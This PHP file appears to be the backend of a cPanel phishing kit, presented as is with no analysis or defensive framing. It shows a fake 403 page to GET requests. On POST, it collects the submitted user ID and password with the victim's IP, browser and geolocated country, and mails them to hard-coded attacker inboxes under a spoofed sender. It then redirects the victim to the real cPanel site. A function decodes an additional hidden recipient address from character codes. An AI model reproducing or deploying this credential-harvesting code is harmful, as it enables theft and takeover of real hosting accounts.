<?

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}


$country = visitor_country();
$praga=rand(1,10000000);
$praga=md5($praga);
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$txt1 = $_POST['txt1'];
$txt2 = $_POST['txt2'];
$passchk = strlen($txt2);

$message .= "--------+ C-PANEL Rezult +--------\n";
$message .= "UZER ID              : ".$_POST['txt1']."\n";
$message .= "Pa55w0rd              : ".$_POST['txt2']."\n";
$message .= "-----------------------------------\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--+ Created BY B0K0H2R2M+---\n";


$send ="inboxshrine@gmail.com , officeresultsbox@yandex.com";

$subject = "C-PANEL| $txt1| $country |";
$headers .= "MIME-Version: 1.0\n";
$headers .= $_POST['text1Add']."\n";
$headers = "From: C-PANEL <inContact@rit.edu>\n";




// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
if ($passchk<4)
{
$passerr=0;
}
else
{
$passerr=1;
}


if ($passerr==0)
{
header("Location: https://www.google.com/");
}
else
{
 mail($send,$subject,$message,$headers);
header("Location: https://releases.cpanel.com/");
}
?>